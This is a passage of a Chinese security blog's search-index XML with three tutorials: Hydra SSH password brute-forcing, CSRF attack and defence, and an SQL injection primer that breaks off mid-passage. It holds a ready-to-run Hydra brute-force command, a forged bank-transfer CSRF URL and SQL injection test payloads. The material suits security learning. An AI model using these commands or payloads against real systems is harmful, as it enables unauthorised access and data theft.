img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码爆破</title>
      <link href="/archives/74455b60.html"/>
      <url>/archives/74455b60.html</url>
      
        <content type="html"><![CDATA[<p>hydra破解工具支持多种协议的登录密码，可以添加新组件，使用方便灵活。hydra可在Linux、Windows和OS X中使用。hydra可以用来破解很多种服务，包括IMAP,HTTP,SMB,VNC,MS-SQL,MySQL,SMTP等等。</p><h1 id="hydra的主要选项"><a href="#hydra的主要选项" class="headerlink" title="hydra的主要选项"></a>hydra的主要选项</h1><p>-R&nbsp;&nbsp;&nbsp;修复之前使用的aborted/crashed session</p><p>-S&nbsp;&nbsp;&nbsp;执行SSL(Secure Socket Layer)连接</p><p>-s&nbsp;&nbsp;&nbsp;Port 使用非默认服务器端口而是其他端口时，指定其端口</p><p>-l&nbsp;&nbsp;&nbsp;Login 已经获取登录ID的情况下输入登录ID</p><p>-L&nbsp;&nbsp;&nbsp;FILE 未获取登录ID情况下指定用于暴力破解的文件（需要指出全路径）</p><p>-p&nbsp;&nbsp;&nbsp;Pass 已经获取登录密码的情况下输入登录密码</p><p>-P&nbsp;&nbsp;&nbsp;FILE 未获取登录密码的情况下指定用于暴力破解的文件（需要指出全路径）</p><p>-x&nbsp;&nbsp;&nbsp;MIN:MAX:CHARSET 暴力破解时不指定文件，而生可以满足指定字符集和最短、最长长度条件的密码来尝试暴力破解</p><p>-C&nbsp;&nbsp;&nbsp;FILE 用于指定由冒号区分形式的暴力破解专用文件，即ID:Password形式</p><p>-M&nbsp;&nbsp;&nbsp;FILE指定实施并列攻击的文件服务器的目录文件</p><p>-o&nbsp;&nbsp;&nbsp;FILE以STDOUT的形式输出结果值</p><p>-f&nbsp;&nbsp;&nbsp;查找到第一个可以使用的ID和密码的时候停止破解</p><p>-t&nbsp;&nbsp;&nbsp;TASKS 指定并列连接数（默认值：16）</p><p>-w&nbsp;&nbsp;&nbsp;指定每个线程的回应时间（Waittime）(默认值：32秒)</p><p>-4/6&nbsp;&nbsp;&nbsp;指定IPv4/IPv6(默认值：IPv4)</p><p>-v/-V&nbsp;&nbsp;&nbsp;显示详细信息</p><p>-U&nbsp;&nbsp;&nbsp;查看服务器组件使用明细</p><p>首先准备字典，可以选择密码在线生成工具，<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a> 或者其它密码生成工具生成密码。<br>举例：在kali系统使用hydra工具进行服务器ssh方式登陆密码爆破。攻击前提是服务器的22端口需处于打开状态。</p><pre><code class="language-bash hljs">hydra -l root -w 10 -P pwd.txt -t 10 -f 111.111.111.111 ssh</code></pre><p>将ip换为需要攻击的服务器的ip即可。参数说明如下：</p><p>-l root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定爆破账号为root</p><p>-w 10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定每个线程的回应时间为10S</p><p>-P pwd.txt&nbsp;&nbsp;指定密码字典为pwd.txt</p><p>-t 10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定爆破线程为10个（部分服务器会限制并发数量，可设置为4线程）</p><p>-v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定显示爆破过程</p><p>-f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查找到第一个可以使用的ID和密码的时候停止破解</p>![](https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/Cryptoblast.png)等待爆破结果，得到密码或者跑完字典就会结束进程。得到密码之后通过ssh登陆验证结果的正确性。<hr><p><strong>欢迎在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</strong></p><table>  <tbody><tr>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/alipay.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/wechat.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/zan.png"></td>     </tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kail </tag>
            
            <tag> Hydra的使用 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF攻击与防御</title>
      <link href="/archives/6a2ce1f9.html"/>
      <url>/archives/6a2ce1f9.html</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF概念"><a href="#CSRF概念" class="headerlink" title="CSRF概念"></a>CSRF概念</h1><ul><li><p>CSRF定义<br>跨站请求伪造（英语：Cross-site request forgery）是一种对网站的恶意利用，也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 CSRF跨站点请求伪造(Cross—Site Request Forgery) 跟XSS攻击一样，存在巨大的危害性。<br>你可以这样来理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。<br>简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。       </p></li><li><p>CSRF地位<br>是一种网络攻击方式，是互联网重大安全隐患之一，NYTimes.com（纽约时报）、Metafilter，YouTube、Gmail和百度HI都受到过此类攻击。</p></li><li><p>对比XSS<br>跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p></li></ul><p>如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/CSRF-attack-and-defense0.jpg" alt=""></p><p>如果上面 CSRF 原理看不懂，可以再看这个原理：</p><p>先了解第一方和第三方cookie概念</p><blockquote><p>Cookie是一个域服务器存储在浏览器中的一小段数据块，只能被这个域访问，谁设置则谁访问。</p></blockquote><ul><li><p>第一方Cookie<br>比如，访问 <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> 这个网站，这个网站设置了一个Cookie，这个Cookie也只能被 <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> 这个域下的网页读取。</p></li><li><p>第三方Cookie<br>比如，访问 <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> 这个网站，网页里有用到 <a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 网站的一张图片，浏览器在 <a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 请求图片的时候，<a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 设置了一个Cookie，那这Cookie只能被 <a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 这个域访问，反而不能被 <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> 这个域访问，因为对我们来说，我们实际是在访问 <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a> 这个网站被设置了一个 <a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 这个域下的Cookie，所以叫第三方Cookie。<br>CSRF 原理：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/CSRF-attack-and-defense1.png" alt=""></p></li><li><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A;</p></li><li><p>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A;</p></li><li><p>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B;</p></li><li><p>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A;</p></li><li><p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p></li></ul><blockquote><p>简而言之： 通过访问恶意网址，恶意网址返回来js自动执行访问你之前登陆的网址，因为你已经登录了，所以再次访问将会携带cookie，因为服务器只认有没有cookie，无法区分是不是用户正常的访问，所以会欺骗服务器，造成伤害</p></blockquote><p>CSRF攻击防御</p><blockquote><p>CSRF攻击防御的重点是利用cookie的值只能被第一方读取，无法读取第三方的cookie值。</p></blockquote><ul><li><p>防御方法：</p><p>预防csrf攻击简单可行的方法就是在客户端网页上再次添加一个cookie，保存一个随机数，而用户访问的时候，先读取这个cookie的值，hash一下这个cookie值并发送给服务器，服务器接收到用户的hash之后的值，同时取出之前设置在用户端的cookie的值，用同样的算法hash这个cookie值，比较这两个hash值，相同则是合法。（如果用户访问了病毒网站，也想带这个cookie去访问的时候，此时，因为病毒网站无法获取第三方cookie的值，所以他也就无法hash这个随机数，所以也就会被服务器校验的过滤掉）</p></li></ul><h1 id="session-工作原理"><a href="#session-工作原理" class="headerlink" title="session 工作原理"></a>session 工作原理</h1><ul><li>CSRF 比 XSS更具危险性。想要深入理解 CSRF 的攻击特性，我们有必要了解一下网站session的工作原理。 </li></ul><p>　　session 我想大家都不陌生，无论你用.net或PHP开发过网站的都肯定用过session对象，然而session它是如何工作的呢？如果你不清楚请往下看。<br>先问个小问题：如果我把浏览器的cookie禁用了，大家认为session还能正常工作吗？ </p><p>　　答案是否定的，我在这边举个简单的例子帮助大家理解session。<br>比如我买了一张高尔夫俱乐部的会员卡，俱乐部给了我一张带有卡号的会员卡。我能享受哪些权利（比如我是高级会员卡可以打19洞和后付费喝饮料，而初级会员卡只能在练习场挥杆）以及我的个人资料都是保存在高尔夫俱乐部的数据库里的。我每次去高尔夫俱乐部只需要出示这张高级会员卡，俱乐部就知道我是谁了，并且为我服务了。</p><p>　　这里我们的高级会员卡卡号 = 保存在cookie的sessionid； 而我的高级会员卡权利和个人信息就是服务端的session对象了。 </p><p>　　我们知道http请求是无状态的，也就是说每次http请求都是独立的无关之前的操作的，但是每次http请求都会将本域下的所有cookie作为http请求头的一部分发送给服务端，所以服务端就根据请求中的cookie存放的sessionid去session对象中找到该会员资料了。<br>当然session的保存方法多种多样，可以保存在文件中，也可以内存里，考虑到分布式的横向扩展我们还是建议把它保存在第三方媒介中，比如redis或者mongodb。 </p><p>　　我们理解了session的工作机制后，CSRF也就很容易理解了。CSRF攻击就相当于恶意用户A复制了我的高级会员卡，哪天恶意用户A也可以拿着这张假冒的高级会员卡去高尔夫俱乐部打19洞，享受美味的饮料了，而我在月底就会收到高尔夫俱乐部的账单！ </p><p>　　了解CSRF的机制之后，危害性我相信大家已经不言而喻了，我可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些欺骗信息（比如借钱之类的），如果CSRF发送的垃圾信息还带有蠕虫链接的话，那些接收到这些有害信息的好友万一打开私信中的连接就也成为了有害信息的散播着，这样数以万计的用户被窃取了资料种植了木马。整个网站的应用就可能在瞬间奔溃，用户投诉，用户流失，公司声誉一落千丈甚至面临倒闭。曾经在MSN上，一个美国的19岁的小伙子Samy利用css的background漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想，同样的事情也曾经发生在新浪微博上面。 </p><blockquote><p>　 举例：<br>  CSRF攻击的主要目的是让用户在不知情的情况下攻击自己已登录的一个系统，类似于钓鱼。如用户当前已经登录了邮箱，或bbs，同时用户又在使用另外一个，已经被你控制的站点，我们姑且叫它钓鱼网站。这个网站上面可能因为某个图片吸引你，你去点击一下，此时可能就会触发一个js的点击事件，构造一个bbs发帖的请求，去往你的bbs发帖，由于当前你的浏览器状态已经是登陆状态，所以session登陆cookie信息都会跟正常的请求一样，纯天然的利用当前的登陆状态，让用户在不知情的情况下，帮你发帖或干其他事情。</p></blockquote><h1 id="CSRF攻击攻击原理及过程"><a href="#CSRF攻击攻击原理及过程" class="headerlink" title="CSRF攻击攻击原理及过程"></a>CSRF攻击攻击原理及过程</h1><ul><li>1 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li><li>2 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li><li>3 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li><li>4 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li><li>5 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以根<br>据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li></ul><blockquote><p>所以要被CSRF攻击，必须同时满足两个条件：</p><p>   登录受信任网站A，并在本地生成Cookie。<br>   在不登出A的情况下，访问危险网站B。</p></blockquote><h1 id="CSRF-攻击实例"><a href="#CSRF-攻击实例" class="headerlink" title="CSRF 攻击实例"></a>CSRF 攻击实例</h1><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</code> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p><p>黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p><p>这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： <code>src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory ”</code>，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p><h1 id="CSRF漏洞检测："><a href="#CSRF漏洞检测：" class="headerlink" title="CSRF漏洞检测："></a>CSRF漏洞检测：</h1><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><p>随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如<code>CSRFTester</code>，<code>CSRF Request Builder</code>等。</p><p>以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p><h1 id="防御CSRF攻击"><a href="#防御CSRF攻击" class="headerlink" title="防御CSRF攻击"></a>防御CSRF攻击</h1><blockquote><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p></blockquote><ul><li><p>（1）验证 HTTP Referer 字段<br>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p><p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p><p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p><p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p></li><li><p>（2）在请求地址中添加 token 并验证</p><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p><p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p></li><li><p>（3）在 HTTP 头中自定义属性并验证</p><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p></li></ul><h1 id="CSRF工具的防御手段"><a href="#CSRF工具的防御手段" class="headerlink" title="CSRF工具的防御手段"></a>CSRF工具的防御手段</h1><ul><li><p>1 尽量使用POST，限制GET</p><p>GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。</p><p>当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p></li><li><p>2 浏览器Cookie策略</p><p>IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。</p><p>PS：Cookie分为两种，Session Cookie（在浏览器关闭后，就会失效，保存到内存里），Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）。</p><p>PS：另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。</p></li><li><p>3 加验证码</p><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。</p></li><li><p>4 Referer Check</p><p>Referer Check在Web最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。</p><p>但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。</p></li><li><p>5 Anti CSRF Token</p><p>现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。</p></li></ul><blockquote><p>例子：</p><ol><li>用户访问某个表单页面。</li><li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li><li>在页面表单附带上Token参数。</li><li>用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li></ol></blockquote><p>  这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p><blockquote><p>注意：</p><p>CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。所以XSS带来的问题，应该使用XSS的防御方案予以解决。   </p></blockquote><hr><p><strong>欢迎在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</strong></p><table>  <tbody><tr>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/alipay.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/wechat.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/zan.png"></td>     </tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
            <tag> web防护 </tag>
            
            <tag> CSRF攻击与防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/archives/e73517db.html"/>
      <url>/archives/e73517db.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、sql注入原理"><a href="#一、sql注入原理" class="headerlink" title="一、sql注入原理"></a>一、sql注入原理</h1><p>注入攻击的本质就是把用户输入的数据当作代码来执行。所以注入攻击有两个必要条件</p><ul><li><p>1.用户能够控制的输入。</p></li><li><p>2.原本程序要执行的代码，拼接了用户输入的数据。</p></li></ul><h1 id="二、sql注入分类"><a href="#二、sql注入分类" class="headerlink" title="二、sql注入分类"></a>二、sql注入分类</h1><ul><li><p>按照请求方法可以分为：GET请求、POST请求</p></li><li><p>按照参数类型可以分为：数字型、字符型</p></li><li><p>按照数据返回结果分为：回显、报错、盲注</p></li><li><p>盲注又分为：布尔盲注、延时盲注</p></li></ul><h1 id="三、sql注入测试方法"><a href="#三、sql注入测试方法" class="headerlink" title="三、sql注入测试方法"></a>三、sql注入测试方法</h1><h2 id="一般测试语句："><a href="#一般测试语句：" class="headerlink" title="一般测试语句："></a>一般测试语句：</h2><table>    <tbody><tr>     <td style="text-align: center;">or 1=1 --+</td>     <td style="text-align: center;">'or 1=1 --+</td>     <td style="text-align: center;">"or 1=1 --+</td>     <td style="text-align: center;">)or 1=1 --+ </td>    </tr> <tr>     <td style="text-align: center;">')or 1=1 --+</td>     <td style="text-align: center;">")or 1=1--+</td>     <td style="text-align: center;">"))or 1=1 --+</td>    </tr></tbody></table><ul><li>url编码后为 %23 ，可以用 –+ 替换</li></ul><h2 id="常用测试函数："><a href="#常用测试函数：" class="headerlink" title="常用测试函数："></a>常用测试函数：</h2><table>    <tbody><tr>       <td style="text-align: center;">函数名</td><td>       </td><td style="text-align: center;">作用</td><td>    </td></tr><tr>       <td style="text-align: center;">version()</td><td>         </td><td style="text-align: center;">数据库版本</td><td>    </td></tr><tr>       <td style="text-align: center;">user()</td><td>       </td><td style="text-align: center;">数据库用户名</td><td>    </td></tr><tr>       <td style="text-align: center;">database()</td><td>       </td><td style="text-align: center;">数据库名</td><td>    </td></tr><tr>       <td style="text-align: center;">@@datadir()</td><td>       </td><td style="text-align: center;">数据库路径</td><td>    </td></tr><tr>       <td style="text-align: center;">@@version_compile_os</td><td>       </td><td style="text-align: center;">操作系统版本</td><td>    </td></tr></tbody></table><h2 id="测试流程："><a href="#测试流程：" class="headerlink" title="测试流程："></a>测试流程：</h2><blockquote><p>这里是在本地搭建的一个 <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">sqli</a>的靶场，用来自己做练习，感觉还不错。    </p></blockquote><h3 id="1-检测sql注入类型"><a href="#1-检测sql注入类型" class="headerlink" title="1.检测sql注入类型"></a>1.检测sql注入类型</h3><hr><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/SQL-injection0.jpg" alt=""></p><blockquote><p>直接在url处添加 单引号 发现网站报错、说明sql语句出错，就可能存在注入</p></blockquote><h3 id="2-闭合sql语句"><a href="#2-闭合sql语句" class="headerlink" title="2.闭合sql语句"></a>2.闭合sql语句</h3><p>一般有两种方法：</p><ul><li><p>a.使用 # 号，把本行 # 号后面的内容注释调，这样就可以避免sql语句出错，使我们构造的 payload 可以正确执行</p></li><li><p>b.根据sql语句，用符号进行闭合</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/SQL-injection1.jpg" alt=""></p><blockquote><p>这里就直接用 # 